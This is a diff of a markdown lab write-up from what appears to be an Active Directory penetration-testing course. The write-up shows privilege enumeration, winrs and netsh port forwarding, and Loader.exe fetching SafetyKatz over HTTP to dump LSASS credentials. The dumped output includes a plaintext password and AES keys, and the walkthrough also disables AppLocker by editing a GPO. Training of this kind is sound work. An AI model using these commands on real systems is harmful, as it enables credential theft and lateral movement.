+Check if `srvadmin` has local admin privileges on any other machine.
 
 `C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
 ```
@@ -690,7 +758,7 @@ Check if `srvadmin` has admin privileges on any other machine.
 ```
 VERBOSE: Trying to run a command parallely on the provided computers list using PSRemoting.
 dcorp-adminsrv
-dcorp-mgmt📌
+dcorp-mgmt🖥️
 ```
 
 We have local admin access on the `dcorp-mgmt` server as `srvadmin` and we already know a session of `svcadmin` is present on that machine.
@@ -712,7 +780,7 @@ Using winrs, add the following port forwarding on `dcorp-mgmt` to avoid detectio
 
 Please note that we must use the `$null` variable to address output redirection issues.
 
-Extract the credentials.
+Extract the credentials from LSASS process memory.
 
 `winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::evasive-keys" "exit"`:
 ```
@@ -723,14 +791,14 @@ mimikatz(commandline) # sekurlsa::evasive-keys📌
 [SNIP]
 
 Authentication Id : 0 ; 830583 (00000000:000cac77)
-Session           : RemoteInteractive from 2
-User Name         : mgmtadmin👤
+Session📌         : RemoteInteractive from 2📌
+User Name         : mgmtadmin
 Domain            : dcorp
 Logon Server      : DCORP-DC
 Logon Time        : 1/16/2025 8:42:36 AM
 SID               : S-1-5-21-719815819-3726368948-3917688648-1120
 
-         * Username : mgmtadmin
+         * Username : mgmtadmin👤
          * Domain   : DOLLARCORP.MONEYCORP.LOCAL🏛️
          * Password : (null)
          * Key List :
@@ -744,16 +812,16 @@ SID               : S-1-5-21-719815819-3726368948-3917688648-1120
 [SNIP]
 
 Authentication Id : 0 ; 58588 (00000000:0000e4dc)
-Session           : Service from 0
-User Name         : svcadmin👤
+Session📌         : Service from 0📌
+User Name         : svcadmin
 Domain            : dcorp
 Logon Server      : DCORP-DC
 Logon Time        : 1/16/2025 7:43:40 AM
 SID               : S-1-5-21-719815819-3726368948-3917688648-1118
 
-         * Username : svcadmin
+         * Username : svcadmin👤
          * Domain   : DOLLARCORP.MONEYCORP.LOCAL🏛️
-         * Password : *ThisisBlasphemyThisisMadness!!
+         * Password : *ThisisBlasphemyThisisMadness!!🔑
          * Key List :
            aes256_hmac       6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011🔑
            aes128_hmac       8c0a8695795df6c9a85c4fb588ad6cbd
@@ -765,23 +833,28 @@ SID               : S-1-5-21-719815819-3726368948-3917688648-1118
 
 [SNIP]
 ```
+🚩
 
-**Disable Applocker on `dcorp-adminsrv` by modifying GPO**
+- **Extract Credentials from the LSASS Process Memory (of the Target Machine 2 `dcorp-adminsrv`) Disabling AppLocker by Modifying the GPO**
 
-Recall that we enumerated that `student422` has Full Control/GenericAll on the Applocked Group Policy. Let's make changes to the Group Policy and disable Applocker on `dcorp-adminsrv`.
+**Please note that modification to GPO is not OPSEC safe but still commonly abuse by threat actors.**
+
+Recall that we enumerated that `student422` has Full Control/`GenericAll` on `Applocker` GPO (see *Learning Objective 02*).
+
+Let's make changes to the GPO and disable Applocker on `dcorp-adminsrv`.
 
 We need the Group Policy Management Console for this.
 As the student VM is a Server 2022 machine, we can install it using the following steps: open Server Manager -> `Add roles and features` -> `Next` -> `Next` -> `Next` -> `Next` -> `Features` -> enable `Group Policy Management` -> `Next` -> `Install`.
 
 ![Install Group Policy Management Console](./assets/screenshots/learning_objective_07_install_gpmc.png)
 
-After the installation is completed, start the gpmc. We need to start a process as `student422` using runas, otherwise gpmc doesn't get the user context.
+After the installation is completed, start the gpmc.
 
-Run the below command **from an elevated shell**.
+We need to start a process as `student422` using runas, otherwise gpmc doesn't get the user context.
 
 ![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `runas /user:dcorp\student422 /netonly cmd`:
 ```
@@ -789,11 +862,9 @@ Enter the password for dcorp\student422:
 Attempting to start cmd as user "dcorp\student422" ...
 ```
 
-Run the below command in the new spawned cmd.
-
 ![New spawned terminal process 3](./assets/screenshots/learning_objective_07_new_spawned_terminal_process_3.png)
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `gpmc.msc`
 
@@ -806,16 +877,16 @@ In the new window, expand `Policies` -> `Windows Settings` -> `Security Settings
 ![Group Policy Management Console - Disable Applocker GPO 2](./assets/screenshots/learning_objective_07_gpmc_disable_applocker_2.png)
 
 Start looking at each category of the `Applocker` policies. You will find out that **there are two restrictions**. Recall that we have already enumerated this earlier.
-1. In the `Executable Rules`, 'Everyone' is allowed to run Microsoft signed binaries.
-2. In the `Script Rules`, 'Everyone' can run Microsoft signed scripts from any location and two default rules where 'Everyone' can run Microsoft signed scripts from `C:\Windows` and `C:\Program Files` folders.
+- In the `Executable Rules`, 'Everyone' is allowed to run Microsoft signed binaries.
+- In the `Script Rules`, 'Everyone' can run Microsoft signed scripts from any location and two default rules where 'Everyone' can run Microsoft signed scripts from `C:\Windows` and `C:\Program Files` folders.
 
 As we already abused the default `Script Rules`, let's go for `Executable Rules`. Right click on the rule and delete it.
 
 ![Group Policy Management Console - Disable Applocker GPO 3](./assets/screenshots/learning_objective_07_gpmc_disable_applocker_3.png)
 
-Now, we can either wait for the Group Policy refresh or force an update on the `dcorp-adminsrv` machine. Let's go for the later using the following commands as `student422`.
+Now, we can either wait for the GPO refresh or force an update on the `dcorp-adminsrv` machine. Let's go for the later using the following commands as `student422`.
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `winrs -r:dcorp-adminsrv cmd`:
 ```
@@ -826,7 +897,7 @@ C:\Users\student422>
 ```
 🚀
 
-![Victim: dcorp-adminsrv | student422](https://custom-icon-badges.demolab.com/badge/dcorp--adminsrv-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-adminsrv | student422](https://custom-icon-badges.demolab.com/badge/dcorp--adminsrv-student422-64b5f6?logo=windows11&logoColor=white)
 
 `gpupdate /force`:
 ```
@@ -838,7 +909,7 @@ User Policy update has completed successfully.
 
 `exit`
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 Now, let's copy `Loader.exe` on the machine and use it to run SafetyKatz.
 
@@ -860,7 +931,7 @@ C:\Users\student422>
 ```
 🚀
 
-![Victim: dcorp-adminsrv | student422](https://custom-icon-badges.demolab.com/badge/dcorp--adminsrv-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-adminsrv | student422](https://custom-icon-badges.demolab.com/badge/dcorp--adminsrv-student422-64b5f6?logo=windows11&logoColor=white)
 
 `netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.22`
 
@@ -896,9 +967,7 @@ SID               : S-1-5-21-719815819-3726368948-3917688648-1117
 ```
 🚩
 
-Sweet! We were able to disable `Applocker`.
-
-**Please note that modification to GPO is not OPSEC safe but still commonly abuse by threat actors.**
+Sweet! We were able to disable Applocker.
 
 ---
 ---
